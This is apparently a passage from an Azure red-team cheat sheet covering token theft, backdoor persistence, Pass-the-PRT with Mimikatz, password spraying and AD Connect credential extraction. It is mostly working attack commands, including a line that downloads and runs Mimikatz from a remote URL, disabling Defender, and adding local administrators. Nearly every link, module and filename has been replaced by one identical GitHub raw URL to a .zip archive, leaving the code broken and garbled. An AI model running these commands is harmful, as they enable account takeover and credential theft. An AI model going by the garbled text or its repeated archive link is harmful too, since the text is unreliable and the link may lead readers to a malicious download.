print(https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["access_token"])
print("ClientID/AccountID: "+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["client_id"])
```

or inside a Python Function:

```py
import logging, os
import https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip as func

def main(req: https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) -> https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_HEADER']
    cmd = 'curl "%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(cmd).read()
    return https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val, status_code=200)
```


### Get Tokens

:warning: The lifetime of a Primary Refresh Token is 14 days!

```powershell
# az cli - get tokens 
az account get-access-token 
az account get-access-token --resource-type aad-graph
# or Az
(Get-AzAccessToken -ResourceUrl https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip).Token
# or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT
```

### Use Tokens

> Tokens contain all the claims including that for MFA and Conditional Access

* Az Powershell
    ```powershell
    PS C:\Tools> $token = 'eyJ0e..'
    PS C:\Tools> Connect-AzAccount -AccessToken $token -AccountId <ACCOUNT-ID>

    # Access Token and Graph Token
    PS C:\Tools> $token = 'eyJ0eX..'
    PS C:\Tools> $graphaccesstoken = 'eyJ0eX..'
    PS C:\Tools> Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
    PS C:\Tools> Get-AzResource
    # ERROR: 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip' cannot be null.
    # ---> The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI
    ```
* AzureAD
    ```powershell
    Import-Module C:\Tools\AzureAD\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    $AADToken = 'eyJ0…'
    Connect-AzureAD -AadAccessToken $AADToken -TenantId <TENANT-ID> -AccountId <ACCOUNT-ID>
    ```

### Refresh Tokens

* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    ```powershell
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip token --username <Username> --password <Password>
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip token --refreshtoken <RefreshToken>
    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip devicekeys --pfxpath https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --refreshtoken (--prtcookie / ---username + --password ) 
    ```
* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    ```powershell
    Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    CommandType     Name                                               Version    Source
    -----------     ----                                               -------    ------
    Function        Clear-Token                                        0.0.1      TokenTactics
    Function        Dump-OWAMailboxViaMSGraphApi                       0.0.1      TokenTactics
    Function        Forge-UserAgent                                    0.0.1      TokenTactics
    Function        Get-AzureToken                                     0.0.1      TokenTactics
    Function        Get-TenantID                                       0.0.1      TokenTactics
    Function        Open-OWAMailboxInBrowser                           0.0.1      TokenTactics
    Function        Parse-JWTtoken                                     0.0.1      TokenTactics
    Function        RefreshTo-AzureCoreManagementToken                 0.0.1      TokenTactics
    Function        RefreshTo-AzureManagementToken                     0.0.1      TokenTactics
    Function        RefreshTo-DODMSGraphToken                          0.0.1      TokenTactics
    Function        RefreshTo-GraphToken                               0.0.1      TokenTactics
    Function        RefreshTo-MAMToken                                 0.0.1      TokenTactics
    Function        RefreshTo-MSGraphToken                             0.0.1      TokenTactics
    Function        RefreshTo-MSManageToken                            0.0.1      TokenTactics
    Function        RefreshTo-MSTeamsToken                             0.0.1      TokenTactics
    Function        RefreshTo-O365SuiteUXToken                         0.0.1      TokenTactics
    Function        RefreshTo-OfficeAppsToken                          0.0.1      TokenTactics
    Function        RefreshTo-OfficeManagementToken                    0.0.1      TokenTactics
    Function        RefreshTo-OutlookToken                             0.0.1      TokenTactics
    Function        RefreshTo-SubstrateToken                           0.0.1      TokenTactics
    ```

## Stealing Tokens

* Get-AzurePasswords
    ```powershell
    Import-Module https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    Get-AzurePasswords
    Get-AzurePasswords -Verbose | Out-GridView
    ```

### Stealing tokens from az cli

* az cli stores access tokens in clear text in **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** in the directory `C:\Users\<username>\.Azure`
* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip in the same directory contains information about subscriptions.

### Stealing tokens from az powershell

* Az PowerShell stores access tokens in clear text in **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** in the directory `C:\Users\<username>\.Azure`
* It also stores **ServicePrincipalSecret** in clear-text in **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** 
* Users can save tokens using `Save-AzContext`


## Add credentials to all Enterprise Applications

```powershell
# Add secrets
PS > . C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose

# Use secrets to authenticate as Service Principal
PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force
PS > $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip('<AppID>', $password)
PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'
```

## Spawn SSH for Azure Web App

```powershell
az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME>
```

## Azure Storage Blob

* Blobs - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
* File Services - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
* Data Tables - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
* Queues - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`

### Enumerate blobs

```powershell
PS > . C:\Tools\MicroBurst\Misc\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
```

### SAS URL

* Use [Storage Explorer](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
* Click on **Open Connect Dialog** in the left menu. 
* Select **Blob container**. 
* On the **Select Authentication Method** page
    * Select **Shared access signature (SAS)** and click on Next
    * Copy the URL in **Blob container SAS URL** field.

:warning: You can also use `subscription`(username/password) to access storage resources such as blobs and files.

### List and download blobs

```powershell
PS Az> Get-AzResource
PS Az> Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context
PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
```

## Runbook Automation

### Create a Runbook

```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group
az ad signed-in-user list-owned-objects

# If the user is not part of an "Automation" group.
# Add him to a custom group , e.g: "Automation Admins"
Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose

# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<AUTOMATION-ACCOUNT>

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>

# Create a Powershell Runbook
PS C:\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```

### Persistence via Automation accounts

* Create a new Automation Account
    * "Create Azure Run As account": Yes
* Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
    * Sample runbook for this Blog located here – https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
    * Publish the runbook
    * Add a webhook to the runbook
* Add the AzureAD module to the Automation account
    * Update the Azure Automation Modules
* Assign "User Administrator" and "Subscription Owner" rights to the automation account
* Eventually lose your access…
* Trigger the webhook with a post request to create the new user
    ```powershell
    $uri = "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip[REDACTED]%3d"
    $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
    $body = ConvertTo-Json -InputObject $AccountInfo
    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
    ```


## Virtual Machine RunCommand

Requirements: 
* `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`

```powershell
# Get Public IP of VM : query the network interface
PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>

# Execute Powershell script on the VM
PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip' -Verbose

# Connect via WinRM
PS C:\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\Tools> $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip('username', $Password)
PS C:\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
PS C:\Tools> Enter-PSSession $sess
```

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System

```powershell
# List available VMs
PS C:\> Get-AzureRmVM -status | where {$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -EQ "VM running"} | select ResourceGroupName,Name
ResourceGroupName    Name       
-----------------    ----       
TESTRESOURCES        Remote-Test

# Execute Powershell script on the VM
PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
```

Against the whole subscription using https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

```powershell
Import-module https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Invoke-AzureRmVMBulkCMD -Script https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Verbose -output https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
```


## KeyVault Secrets

```powershell
# keyvault access token
curl "$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:$IDENTITY_HEADER
curl "$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:$IDENTITY_HEADER

# connect
PS> $token = 'eyJ0..'
PS> $keyvaulttoken = 'eyJ0..'
PS Az> Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken

# query the vault and the secrets
PS Az> Get-AzKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

## Pass The PRT

> MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).

```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip).downloadstring("https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Copy the Context, ClearKey and DerivedKey
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
```

```powershell
# Generate a JWT
PS> Import-Module C:\Tools\AADInternals\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS AADInternals> $PRT_OF_USER = '...'
PS AADInternals> while($https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip % 4) {$PRT_OF_USER += "="}
PS AADInternals> $PRT = [https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip]https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip([convert]::FromBase64String($PRT_OF_USER))
PS AADInternals> $ClearKey = "XXYYZZ..."
PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
eyJ0eXAiOiJKV1QiL...
```

The `<Signed JWT>` (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip    
Edit the Chrome cookie (F12) -> Application -> Cookies with the values:

```powershell
Name: x-ms-RefreshTokenCredential
Value: <Signed JWT>
HttpOnly: √
```

:warning: Mark the cookie with the flags `HTTPOnly` and `Secure`.


## Pass The Certificate

```ps1
Copy-Item -ToSession $jumpvm -Path C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Destination C:\Users\Username\Documents\username –Verbose
Expand-Archive -Path C:\Users\Username\Documents\username\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert

# Require the PRT, TenantID, Context and DerivedKey
& 'C:\Program Files\Python39\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip' C:\Users\Username\Documents\username\PrtToCert\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
# PFX saved with the name <Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip and password AzureADCert
```

Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine

https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

```ps1
https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --usercert "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" --certpass password --remoteip 10.10.10.10

python https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --
certpass AzureADCert --remoteip 10.10.10.10 --command "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /c net user username Password@123 /add /Y && net localgroup administrators username /add"
```

## Intunes Administration

Requirements:
* **Global Administrator** or **Intune Administrator** Privilege : `Get-AzureADGroup -Filter "DisplayName eq 'Intune Administrators'"`

1. Login into https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip or use Pass-The-PRT
2. Go to **Devices** -> **All Devices** to check devices enrolled to Intune
3. Go to **Scripts** and click on **Add** for Windows 10. 
4. Add a **Powershell script**
5. Specify **Add all users** and **Add all devices** in the **Assignments** page.

:warning: It will take up to one hour before you script is executed !



## Dynamic Group Membership

Get groups that allow Dynamic membership: `Get-AzureADMSGroup | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq 'DynamicMembership'}`

Rule example : `(https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -any (_ -contains "vendor")) -and (https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "guest")`    
Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group

1. Open user's profile, click on **Manage**
2. Click on **Resend** invite and to get an invitation URL
3. Set the secondary email
    ```powershell
    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Verbose
    ```

## Administrative Unit

> Administrative Unit can reset password of another user

```powershell
PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl
PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId>
PS AzureAD> Get-AzureADUser -ObjectId <https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip> | fl 
PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
PS C:\Tools> (Get-AzureADUser -All $true | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "<Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
```

## Deployment Template

```powershell
PS Az> Get-AzResourceGroup
PS Az> Get-AzResourceGroupDeployment -ResourceGroupName SAP

# Export
PS Az> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
cat <DEPLOYMENT NAME>.json # search for hardcoded password
cat <PATH TO .json FILE> | Select-String password
```

## Application Proxy

```powershell
# Enumerate application that have Proxy
PS C:\Tools> Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip;$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip;$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip}catch{}}
PS C:\Tools> Get-AzureADServicePrincipal -All $true | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq "Finance Management System"}
PS C:\Tools> . C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS C:\Tools> Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT-ID>
```

## Conditional Access

* Bypassing conditional access by copying User-Agent (Chrome Dev Tool > Select iPad Pro, etc)
* Bypassing conditional access by faking device compliance
    ```powershell
    # AAD Internals - Making your device compliant
    # Get an access token for AAD join and save to cache
    Get-AADIntAccessTokenForAADJoin -SaveToCache
    # Join the device to Azure AD
    Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
    # Marking device compliant - option 1: Registering device to Intune
    # Get an access token for Intune MDM and save to cache (prompts for credentials)
    Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -SaveToCache 
    # Join the device to Intune
    Join-AADIntDeviceToIntune -DeviceName "SixByFour"
    # Start the call back
    Start-AADIntDeviceIntuneCallback -PfxFileName .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -DeviceName "SixByFour"
    ```


## Azure AD

With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.

1. Authenticate to your webmail portal (i.e. https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
2. Change your browser URL to: https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
3. Pick the account from the active sessions
4. Select Azure Active Directory and enjoy!

### Azure AD vs Active Directory

| Active Directory  | Azure AD  |
|---|---|
| LDAP  | REST API'S  |
| NTLM/Kerberos  | OAuth/SAML/OpenID |
| Structured directory (OU tree)  | Flat structure  |
| GPO  | No GPO's  |
| Super fine-tuned access controls  | Predefined roles |
| Domain/forest  | Tenant  |
| Trusts  | Guests  |

* Password Hash Syncronization (PHS)
    * Passwords from on-premise AD are sent to the cloud
    * Use replication via a service account created by AD Connect
* Pass Through Authentication (PTA)
    * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text
* Connect Windows Server AD to Azure AD using Federation Server (ADFS)
    * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password


* Azure AD Joined : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* Workplace Joined : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* Hybrid Joined : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
* Workplace joined on AADJ or Hybrid : https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip

### Password Spray

> Default lockout policy of 10 failed attempts, locking out an account for 60 seconds

```powershell
git clone https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
Invoke-MSOLSpray -UserList .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Password Winter2020
Invoke-MSOLSpray -UserList .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Password d0ntSprayme!

# UserList  - UserList file filled with usernames one-per-line in the format "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip"
# Password  - A single password that will be used to perform the password spray.
# OutFile   - A file to output valid results to.
# Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.
# URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
```

### Convert GUID to SID

The user's AAD id is translated to SID by concatenating `"S-1–12–1-"` to the decimal representation of each section of the AAD Id.

```powershell
GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
```

For example, the representation of `6aa89ecb-1f8f-4d92–810d-b0dce30b6c82` is `S-1–12–1–1789435595–1301421967–3702525313–2188119011`

## Azure AD Connect 

Check if Azure AD Connect is installed : `Get-ADSyncConnector`

* For **PHS**, we can extract the credentials
* For **PTA**, we can install the agent
* For **Federation**, we can extract the certificate from ADFS server using DA

```powershell
PS > Set-MpPreference -DisableRealtimeMonitoring $true
PS > Copy-Item -ToSession $adcnct -Path C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Destination C:\Users\Administrator\Documents
PS > Expand-Archive C:\Users\Administrator\Documents\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
PS > Import-Module C:\Users\Administrator\Documents\AADInternals\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
PS > Get-AADIntSyncCredentials

# Get Token for SYNC account and reset on-prem admin password
PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
PS > $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip ("<Username>@<TenantName>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip", $passwd)
PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
PS > Get-AADIntUser -UserPrincipalName https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip | select ImmutableId
PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose
```

